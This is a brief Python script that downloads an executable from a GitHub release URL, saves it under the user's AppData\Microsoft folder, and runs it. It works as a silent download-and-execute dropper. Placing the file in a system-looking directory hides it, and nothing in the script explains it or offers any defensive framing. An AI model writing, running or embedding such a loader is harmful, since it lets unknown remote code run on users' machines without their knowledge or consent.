import urllib.request
import subprocess
import os




url = "https://github.com/ApfelsaftDevs/test12345/releases/download/1.0/kekwltd.exe"
filename = "kekwltd.exe"
spath = os.path.join(os.getenv("APPDATA"), "Microsoft")
filepath = os.path.join(spath, filename)
response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)
subprocess.call(["start", filepath], cwd=spath)